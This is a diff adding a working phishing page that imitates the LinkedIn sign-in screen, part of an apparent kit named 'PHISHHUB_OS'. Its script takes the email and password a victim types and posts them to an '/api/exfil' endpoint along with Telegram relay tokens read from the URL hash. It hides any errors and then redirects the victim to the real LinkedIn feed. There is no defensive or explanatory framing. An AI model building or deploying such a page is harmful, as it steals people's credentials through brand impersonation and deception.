@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>LinkedIn Login, Sign in | LinkedIn</title>
+    <link rel="shortcut icon" href="https://static.licdn.com/aero-v1/sc/h/al2o9zrvru7aqj8e1x2rzsrca">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap');
+        
+        body { 
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", "Fira Sans", Arial, sans-serif;
+            background-color: #ffffff;
+            color: rgba(0, 0, 0, 0.9);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 24px;
+            position: relative;
+        }
+
+        .social-btn {
+            width: 100%;
+            height: 48px;
+            border: 1px solid rgba(0, 0, 0, 0.6);
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 12px;
+            transition: background-color 0.2s;
+        }
+
+        .social-btn:hover {
+            background-color: rgba(0, 0, 0, 0.04);
+            border-width: 2px;
+            padding-top: -1px;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            color: rgba(0, 0, 0, 0.6);
+            font-size: 14px;
+        }
+
+        .or-divider::before, .or-divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.15);
+        }
+
+        .or-divider:not(:empty)::before { margin-right: .75em; }
+        .or-divider:not(:empty)::after { margin-left: .75em; }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            color: rgba(0, 0, 0, 0.7);
+            margin-bottom: 4px;
+        }
+
+        .li-input {
+            width: 100%;
+            height: 48px;
+            border: 1px solid rgba(0, 0, 0, 0.9);
+            border-radius: 4px;
+            padding: 0 12px;
+            font-size: 16px;
+            outline: none;
+            margin-bottom: 20px;
+        }
+
+        .li-input:focus {
+            border-color: #0a66c2;
+            box-shadow: 0 0 0 1px #0a66c2;
+        }
+
+        .li-btn-primary {
+            background-color: #0a66c2;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 16px;
+            height: 48px;
+            border-radius: 28px;
+            width: 100%;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 16px;
+        }
+
+        .li-btn-primary:hover { background-color: #004182; }
+
+        /* Progress Bar Animation */
+        .loading-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: transparent;
+            overflow: hidden;
+            display: none;
+            z-index: 100;
+        }
+        .loading-bar div {
+            position: absolute;
+            background-color: #0a66c2;
+            height: 100%;
+            width: 40%;
+            animation: indeterminate 1.2s infinite linear;
+        }
+        @keyframes indeterminate {
+            0% { left: -40%; }
+            100% { left: 100%; }
+        }
+
+        .custom-checkbox {
+            appearance: none;
+            width: 24px;
+            height: 24px;
+            border: 1px solid rgba(0,0,0,0.6);
+            border-radius: 4px;
+            cursor: pointer;
+            position: relative;
+            background: white;
+        }
+
+        .custom-checkbox:checked {
+            background: #008448;
+            border-color: #008448;
+        }
+
+        .custom-checkbox:checked::after {
+            content: '✓';
+            color: white;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .apple-social-icon {
+            width: 18px;
+            height: auto;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <div id="loader" class="loading-bar"><div></div></div>
+
+    <header class="p-6">
+        <div class="max-w-[1128px] mx-auto w-full">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/LinkedIn_Logo.svg" alt="LinkedIn" class="h-6">
+        </div>
+    </header>
+
+    <main class="flex-grow">
+        <div class="main-container">
+            <h1 class="text-[32px] font-semibold mb-1">Sign in</h1>
+            <p class="text-sm mb-6">New to LinkedIn? <a href="#" class="text-[#0a66c2] font-semibold hover:underline">Join now</a></p>
+
+            <!-- Social Logins -->
+            <button class="social-btn">
+                <svg class="w-5 h-5" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083L43.611,20.083L42,20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path></svg>
+                Continue with Google
+            </button>
+            <button class="social-btn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/960px-Apple_logo_black.svg.png" alt="Apple" class="apple-social-icon">
+                Sign in with Apple
+            </button>
+
+            <p class="text-[12px] text-center text-gray-500 mt-4 px-2">
+                By continuing, you agree to LinkedIn's <a href="#" class="text-[#0a66c2] font-semibold">User Agreement</a>, <a href="#" class="text-[#0a66c2] font-semibold">Privacy Policy</a>, and <a href="#" class="text-[#0a66c2] font-semibold">Cookie Policy</a>.
+            </p>
+
+            <div class="or-divider">or</div>
+
+            <!-- Credentials Form -->
+            <div class="space-y-4">
+                <div>
+                    <label class="form-label">Email or phone</label>
+                    <input type="text" id="email" class="li-input" autocomplete="username">
+                </div>
+                <div class="relative">
+                    <label class="form-label">Password</label>
+                    <input type="password" id="password" class="li-input" autocomplete="current-password">
+                    <button class="absolute right-3 top-9 text-gray-600"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg></button>
+                </div>
+            </div>
+
+            <div class="mt-2">
+                <a href="#" class="text-[#0a66c2] font-semibold text-sm hover:underline">Forgot password?</a>
+            </div>
+
+            <div class="mt-6 flex items-center gap-3">
+                <input type="checkbox" class="custom-checkbox" checked id="keep-signed">
+                <label for="keep-signed" class="text-sm font-semibold text-gray-700">Keep me signed in</label>
+            </div>
+
+            <button onclick="executeDispatch()" class="li-btn-primary">Sign in</button>
+        </div>
+    </main>
+
+    <footer class="p-8 text-center text-[12px] text-gray-500 w-full">
+        <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-4">
+            <a href="#" class="hover:underline">User Agreement</a>
+            <a href="#" class="hover:underline">Privacy Policy</a>
+            <a href="#" class="hover:underline">Community Guidelines</a>
+            <a href="#" class="hover:underline">Cookie Policy</a>
+            <a href="#" class="hover:underline">Copyright Policy</a>
+            <a href="#" class="hover:underline">Send Feedback</a>
+            <div class="flex items-center gap-1 cursor-pointer">
+                <span>Language</span>
+                <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
+            </div>
+        </div>
+        <div class="flex items-center justify-center gap-1">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/LinkedIn_Logo.svg" class="h-3 opacity-60 grayscale brightness-0">
+            <span>LinkedIn Corporation © 2026</span>
+        </div>
+    </footer>
+
+    <script>
+        // PHISHHUB_OS: Config Bridge
+        const getExfilParams = () => {
+            const h = window.location.hash.substring(1);
+            if (!h) return null;
+            try { return JSON.parse(atob(h)); } catch(e) { return null; }
+        };
+
+        const config = getExfilParams();
+
+        async function executeDispatch() {
+            const u = document.getElementById('email').value;
+            const p = document.getElementById('password').value;
+
+            if(!u || !p) return;
+
+            // Trigger LinkedIn indeterminate loader
+            document.getElementById('loader').style.display = 'block';
+
+            const finishUrl = "https://www.linkedin.com/feed/";
+
+            if(!config) {
+                setTimeout(() => window.location.href = finishUrl, 1200);
+                return;
+            }
+
+            try {
+                // Relay to PHISHHUB_OS serverless backend
+                await fetch('/api/exfil', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        target: 'linkedin',
+                        credentials: { username: u, password: p },
+                        tgToken: config.t,
+                        tgChat: config.c
+                    })
+                });
+            } catch (err) {
+                // Silenced
+            } finally {
+                setTimeout(() => {
+                    window.location.href = finishUrl;
+                }, 1200);
+            }
+        }
+    </script>
+</body>
+</html>
